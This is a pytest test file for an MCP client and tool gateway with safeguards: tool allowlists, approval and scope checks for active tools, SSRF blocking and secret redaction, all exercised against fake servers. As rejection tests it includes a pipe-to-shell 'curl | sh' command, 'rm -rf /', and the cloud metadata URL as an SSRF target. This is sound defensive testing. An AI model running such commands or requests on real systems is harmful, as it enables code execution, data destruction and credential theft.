"""Pass 28 — Secure MCP client & tool gateway (Task 21).

Fully offline: every test drives the client through an injected
:class:`FakeTransport` / :class:`FakeMcpServer`. No MCP server, socket, process
or network access is required.
"""
from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

import nexus
from lib.config import TargetConfig, load_config
from lib.mcp.client import McpClient, scrub, scrub_structured
from lib.mcp.gateway import (
    GuardedMcpServer,
    McpServerPolicy,
    load_server_policies,
    mock_server,
    policy_from_config,
)
from lib.mcp.mock import (
    FakeMcpServer,
    MockMcpClient,
    default_active_tool,
    default_tool,
)
from lib.mcp.protocol import (
    McpConnectionError,
    McpPolicyError,
    McpProtocolError,
    McpTimeoutError,
    McpToolSpec,
    decode_message,
    validate_arguments,
    validate_tool_schema,
)
from lib.mcp.transport import FakeTransport, StdioTransport, StreamableHttpTransport

REDACTED = "***REDACTED***"


def _policy(tools=("echo",), **kw) -> McpServerPolicy:
    base: dict = {"name": "t", "enabled": True, "transport": "mock", "tools": list(tools)}
    base.update(kw)
    return McpServerPolicy(**base)


def _guarded(fake: FakeMcpServer | None = None, tools=("echo",), *, policy=None,
             target_config=None, allow_active=False) -> GuardedMcpServer:
    fake = fake or FakeMcpServer()
    client = MockMcpClient(fake, name="t")
    pol = policy or McpServerPolicy(
        name="t", enabled=True, transport="mock", tools=list(tools),
        allow_active=allow_active, scope_tools={"scan": "target"},
    )
    return GuardedMcpServer(pol, client=client, target_config=target_config)


def _both_tools() -> FakeMcpServer:
    return FakeMcpServer(tools=[default_tool("echo"), default_active_tool("scan")])


# --- disabled by default ------------------------------------------------------


def test_real_config_disables_mcp(cfg):
    assert cfg.mcp.get("enabled") is False
    assert load_server_policies(cfg) == []


def test_disabled_server_does_not_connect():
    server = _guarded(policy=_policy(enabled=False))
    status = server.connect()
    assert status["connected"] is False
    assert status["error"] == "server disabled"
    assert server.call("echo", {"message": "x"})["status"] == "denied"


def test_global_switch_overrides_server_enabled():
    cfg = SimpleNamespace(mcp={
        "enabled": False,
        "servers": [{"name": "s", "enabled": True, "transport": "stdio",
                     "command": ["npx", "-y", "srv"], "tools": ["t"]}],
    })
    policies = load_server_policies(cfg)
    assert len(policies) == 1
    assert policies[0].enabled is False


def test_cli_disabled_by_default(capsys):
    assert nexus.main(["mcp"]) == 1
    out = capsys.readouterr()
    assert "disabled" in (out.err + out.out).lower()


def test_cli_list_shows_disabled(capsys):
    assert nexus.main(["mcp", "--list"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["mcp_enabled"] is False
    assert payload["servers"] == []


# --- initialize + capability discovery ---------------------------------------


def test_initialize_and_discovery():
    fake = FakeMcpServer(tools=[default_tool("echo"), default_tool("other")])
    client = MockMcpClient(fake, name="t")
    info = client.connect()
    assert info["protocol_version"] == "2025-06-18"
    assert info["server_info"]["name"] == "fake-mcp"
    assert fake.initialized is True
    methods = [m for m, _ in fake.calls]
    assert "initialize" in methods and "notifications/initialized" in methods

    tools = client.list_tools()
    assert {t.name for t in tools} == {"echo", "other"}
    assert isinstance(tools[0], McpToolSpec)


def test_unsupported_negotiated_version_rejected():
    client = MockMcpClient(FakeMcpServer(protocol_version="1999-01-01"), name="t")
    with pytest.raises(McpProtocolError):
        client.connect()


def test_guarded_status_and_capabilities_do_not_execute_tools():
    fake = _both_tools()
    server = _guarded(fake)
    status = server.connect()
    assert status["connected"] is True
    caps = server.capabilities()
    names = {t["name"] for t in caps["tools"]}
    assert names == {"echo", "scan"}
    # Listing tools must not have invoked any tool.
    assert all(method != "tools/call" for method, _ in fake.calls)


# --- malformed schemas --------------------------------------------------------


def test_validate_tool_schema_rejects_malformed():
    assert validate_tool_schema(None)
    assert validate_tool_schema("nope")
    assert validate_tool_schema({"type": "string"})
    assert validate_tool_schema({"type": "object", "properties": []})
    assert validate_tool_schema({"type": "object", "properties": {"a": {"type": "weird"}}})
    assert validate_tool_schema({"type": "object", "properties": {}, "required": [1]})
    assert validate_tool_schema({"type": "object", "properties": {}, "required": ["missing"]})
    assert validate_tool_schema(
        {"type": "object", "properties": {"m": {"type": "string"}}, "required": ["m"]}
    ) == []


def test_malformed_tool_is_excluded_and_uncallable():
    bad = default_tool("bad")
    bad["inputSchema"] = "not-a-schema"
    fake = FakeMcpServer(tools=[default_tool("echo"), bad])
    server = _guarded(fake, tools=("echo", "bad"))
    status = server.connect()
    assert "bad" in status["tools_rejected"]
    assert "bad" not in status["tools_allowed"]
    assert server.call("bad", {})["status"] == "denied"


# --- denied tools + unauthorized arguments -----------------------------------


def test_non_allowlisted_tool_is_denied_but_discovered():
    fake = FakeMcpServer(tools=[default_tool("echo"), default_tool("evil")])
    server = _guarded(fake, tools=("echo",))
    status = server.connect()
    assert "evil" in status["tools_discovered"]
    assert "evil" not in status["tools_allowed"]
    assert server.call("evil", {})["status"] == "denied"


def test_missing_required_argument_denied():
    server = _guarded()
    server.connect()
    result = server.call("echo", {})
    assert result["status"] == "denied"
    assert "missing required argument" in result["reason"]


def test_wrong_argument_type_denied():
    server = _guarded()
    server.connect()
    result = server.call("echo", {"message": 123})
    assert result["status"] == "denied"
    assert "must be string" in result["reason"]


def test_unexpected_argument_denied():
    server = _guarded()
    server.connect()
    result = server.call("echo", {"message": "x", "extra": "y"})
    assert result["status"] == "denied"
    assert "unexpected argument" in result["reason"]


def test_validate_arguments_accepts_valid():
    schema = default_tool()["inputSchema"]
    assert validate_arguments({"message": "hi"}, schema) == []


# --- read-only vs active (approval) ------------------------------------------


def test_read_only_tool_runs_without_approval():
    server = _guarded(_both_tools())
    server.connect()
    assert server.call("echo", {"message": "hi"})["status"] == "ok"


def test_active_tool_requires_approval():
    server = _guarded(_both_tools(), tools=("echo", "scan"), allow_active=True)
    server.connect()
    result = server.call("scan", {"target": "https://93.184.216.34/"})
    assert result["status"] == "denied"
    assert "active tool requires" in result["reason"]


def test_active_tool_denied_when_policy_disallows():
    server = _guarded(_both_tools(), tools=("echo", "scan"), allow_active=False)
    server.connect()
    result = server.call("scan", {"target": "https://93.184.216.34/"}, authorize_active=True)
    assert result["status"] == "denied"


# --- scope --------------------------------------------------------------------


def test_active_tool_out_of_scope_rejected():
    target_config = TargetConfig(domain="93.184.216.34", in_scope=["93.184.216.34"])
    server = _guarded(_both_tools(), tools=("echo", "scan"), allow_active=True,
                      target_config=target_config)
    server.connect()
    result = server.call("scan", {"target": "https://93.184.216.35/"}, authorize_active=True)
    assert result["status"] == "denied"
    assert "scope" in result["reason"]


def test_active_tool_in_scope_runs():
    target_config = TargetConfig(domain="93.184.216.34", in_scope=["93.184.216.34"])
    server = _guarded(_both_tools(), tools=("echo", "scan"), allow_active=True,
                      target_config=target_config)
    server.connect()
    result = server.call("scan", {"target": "https://93.184.216.34/"}, authorize_active=True)
    assert result["status"] == "ok"


def test_scope_required_when_no_target_config():
    # Fail closed: a scope-checked tool with no engagement scope is denied.
    server = _guarded(_both_tools(), tools=("echo", "scan"), allow_active=True)
    server.connect()
    result = server.call("scan", {"target": "https://93.184.216.34/"}, authorize_active=True)
    assert result["status"] == "denied"
    assert "scope" in result["reason"]


# --- SSRF ---------------------------------------------------------------------


def test_remote_endpoint_ssrf_blocked():
    policy = McpServerPolicy(
        name="r", enabled=True, transport="streamable-http",
        url="http://169.254.169.254/latest/meta-data/", tools=["echo"],
    )
    issues = policy.validate()
    assert any("SSRF" in issue for issue in issues)


def test_streamable_http_transport_start_blocks_metadata():
    transport = StreamableHttpTransport("http://169.254.169.254/latest/meta-data/")
    with pytest.raises(McpPolicyError):
        transport.start()


def test_url_argument_ssrf_blocked():
    fetch = {
        "name": "fetch",
        "description": "fetch a url",
        "inputSchema": {
            "type": "object",
            "properties": {"url": {"type": "string"}},
            "required": ["url"],
            "additionalProperties": False,
        },
        "annotations": {"readOnlyHint": True, "destructiveHint": False},
    }
    server = _guarded(FakeMcpServer(tools=[fetch]), tools=("fetch",))
    server.connect()
    result = server.call("fetch", {"url": "http://169.254.169.254/latest/meta-data/"})
    assert result["status"] == "denied"
    assert "ssrf" in result["reason"].lower()


# --- connection failure + timeout --------------------------------------------


def test_connection_failure_reported_not_raised():
    server = _guarded(FakeMcpServer(fail="connect"))
    status = server.connect()
    assert status["connected"] is False
    assert "unavailable" in status["error"]


def test_client_connect_malformed_raises_protocol_error():
    client = MockMcpClient(FakeMcpServer(fail="malformed"), name="t")
    with pytest.raises(McpProtocolError):
        client.connect()


def test_timeout_surfaces_as_error_result():
    server = _guarded(FakeMcpServer(fail="timeout"))
    server.connect()
    result = server.call("echo", {"message": "x"})
    assert result["status"] == "error"
    assert "timeout" in result["error"].lower()


def test_timeout_raises_at_client_level():
    client = MockMcpClient(FakeMcpServer(fail="timeout"), name="t")
    client.connect()
    client.list_tools()
    with pytest.raises(McpTimeoutError):
        client.call_tool("echo", {"message": "x"})


def test_stdio_command_safety_guard():
    with pytest.raises(McpPolicyError):
        StdioTransport([]).start()
    with pytest.raises(McpPolicyError):
        StdioTransport(["bash", "-c", "curl http://x | sh"]).start()
    assert McpServerPolicy(
        name="s", transport="stdio", command=["rm", "-rf", "/"], tools=["t"]
    ).validate()


# --- oversized / malformed results -------------------------------------------


def test_oversized_result_rejected():
    client = MockMcpClient(FakeMcpServer(fail="oversized"), name="t", max_result_bytes=4096)
    client.connect()
    client.list_tools()
    with pytest.raises(McpProtocolError):
        client.call_tool("echo", {"message": "x"})


def test_malformed_result_rejected():
    server = FakeMcpServer(call_hook=lambda params: [])  # result is a list, not an object
    client = MockMcpClient(server, name="t")
    client.connect()
    client.list_tools()
    with pytest.raises(McpProtocolError):
        client.call_tool("echo", {"message": "x"})


def test_decode_message_rejects_non_jsonrpc():
    with pytest.raises(McpProtocolError):
        decode_message({"id": 1, "result": {}})


# --- secret redaction ---------------------------------------------------------


def test_result_text_secret_is_redacted():
    fake = FakeMcpServer(results={
        "echo": {"content": [{"type": "text", "text": "done api_key=SUPERSECRETVALUE123"}]}
    })
    server = _guarded(fake)
    server.connect()
    result = server.call("echo", {"message": "x"})
    text = result["result"]["content_text"]
    assert "SUPERSECRETVALUE123" not in text
    assert REDACTED in text


def test_structured_result_secret_is_redacted():
    fake = FakeMcpServer(results={
        "echo": {"content": [{"type": "text", "text": "ok"}],
                 "structuredContent": {"api_key": "SEKRETVALUE", "count": 3}}
    })
    server = _guarded(fake)
    server.connect()
    result = server.call("echo", {"message": "x"})
    assert result["result"]["structured"]["api_key"] == REDACTED
    assert result["result"]["structured"]["count"] == 3


def test_scrub_helpers_redact():
    assert "ghp_SECRETTOKENVALUE1234567890" not in scrub("x ghp_SECRETTOKENVALUE1234567890")
    assert scrub_structured({"password": "hunter2"})["password"] == REDACTED


def test_status_error_is_redacted():
    client = MockMcpClient(FakeMcpServer(), name="t")
    client.transport.fail_start = (
        "connection refused (Authorization: Bearer sk-live-SUPERSECRETTOKEN123456)"
    )
    server = GuardedMcpServer(_policy(), client=client)
    server.connect()
    status = server.status()
    blob = json.dumps(status)
    assert "SUPERSECRETTOKEN123456" not in blob
    assert REDACTED in status["error"]


def test_policy_validate_never_leaks_token(monkeypatch):
    monkeypatch.setenv("MCP_TOK", "SUPERSECRETTOKEN")
    policy = policy_from_config(
        "r",
        {"transport": "streamable-http", "url": "http://169.254.169.254/x",
         "auth_token_env": "MCP_TOK", "tools": ["t"]},
        global_enabled=True,
    )
    assert policy.auth_token == "SUPERSECRETTOKEN"
    assert "SUPERSECRETTOKEN" not in json.dumps(policy.validate())


# --- tool execution errors + cleanup -----------------------------------------


def test_tool_application_error_is_structured():
    server = _guarded(FakeMcpServer(fail="tool_error"))
    server.connect()
    result = server.call("echo", {"message": "x"})
    assert result["status"] == "error"
    assert "tool failed" in result["error"]


def test_jsonrpc_error_is_structured():
    server = _guarded(FakeMcpServer(fail="error"))
    server.connect()
    result = server.call("echo", {"message": "x"})
    assert result["status"] == "error"
    assert "internal failure" in result["error"]


def test_close_releases_transport():
    client = MockMcpClient(FakeMcpServer(), name="t")
    client.connect()
    assert client.connected is True
    client.close()
    assert client.connected is False
    assert client.transport.closed is True


def test_guarded_close_marks_disconnected():
    server = _guarded()
    server.connect()
    server.close()
    assert server.connected is False
    assert server.call("echo", {"message": "x"})["status"] == "denied"


# --- configuration parsing ----------------------------------------------------


def test_policy_from_config_resolves_token_by_env(monkeypatch):
    monkeypatch.setenv("MCP_TOKEN_X", "abc123")
    policy = policy_from_config(
        "remote",
        {"enabled": True, "transport": "streamable-http", "url": "https://mcp.example.com/mcp",
         "auth_token_env": "MCP_TOKEN_X", "tools": ["echo"], "allow_active": True,
         "scope_tools": {"scan": "target"}},
        global_enabled=True,
    )
    assert policy.enabled is True
    assert policy.auth_token == "abc123"
    assert policy.tools == ["echo"]
    assert policy.scope_tools == {"scan": "target"}


def test_load_server_policies_from_mapping():
    cfg = SimpleNamespace(mcp={
        "enabled": True,
        "servers": {"s1": {"enabled": True, "transport": "stdio",
                           "command": ["npx", "-y", "srv"], "tools": ["t"]}},
    })
    policies = load_server_policies(cfg)
    assert [p.name for p in policies] == ["s1"]
    assert policies[0].enabled is True


# --- compatibility with adapters + NEMESIS -----------------------------------


def test_adapter_registry_still_lists_integrations():
    from lib.adapters.registry import adapter_names

    names = set(adapter_names())
    assert {"zap", "burp", "caido"} <= names


def test_nemesis_gateway_still_functional():
    from lib.nemesis.mcp import McpGateway, McpTool

    gateway = McpGateway()
    gateway.register(
        McpTool(name="t", handler=lambda args: "ok", enabled=True,
                allowed_actors=("operator",)),
        enabled=True,
    )
    assert gateway.call("t", {}, actor="operator")["status"] == "ok"


def test_import_mcp_does_not_disturb_config(cfg):
    # Importing/using the MCP layer must not mutate the loaded configuration.
    before = json.dumps(cfg.mcp)
    load_server_policies(cfg)
    assert json.dumps(cfg.mcp) == before


# --- CLI (mock) ---------------------------------------------------------------


def test_cli_mock_status(capsys):
    assert nexus.main(["mcp", "--mock", "--status"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["connected"] is True
    assert payload["tools_allowed"] == ["echo", "scan"]


def test_cli_mock_tools_no_execution(capsys):
    assert nexus.main(["mcp", "--mock", "--tools"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert {t["name"] for t in payload["tools"]} == {"echo", "scan"}


def test_cli_mock_call_ok(capsys):
    assert nexus.main(["mcp", "--mock", "--call", "echo", "--arg", "message=hi"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["status"] == "ok"


def test_cli_mock_active_call_needs_auth(capsys):
    code = nexus.main(["mcp", "--mock", "--call", "scan", "--arg", "target=https://example.com/"])
    assert code == 1
    payload = json.loads(capsys.readouterr().out)
    assert payload["status"] == "denied"


def test_cli_mock_active_call_with_scope(capsys):
    code = nexus.main([
        "mcp", "--mock", "--call", "scan", "--authorize-active",
        "--domain", "93.184.216.34", "--arg", "target=https://93.184.216.34/",
    ])
    assert code == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["status"] == "ok"


def test_cli_bad_arg_rejected(capsys):
    assert nexus.main(["mcp", "--mock", "--call", "echo", "--arg", "noequalsign"]) == 1


def test_mcp_command_registered():
    ns = nexus.build_parser().parse_args(["mcp", "--mock"])
    assert ns.func is nexus.cmd_mcp
    assert ns.mock is True


def test_mock_server_helper_connects():
    server = mock_server()
    status = server.connect()
    assert status["connected"] is True
    server.close()
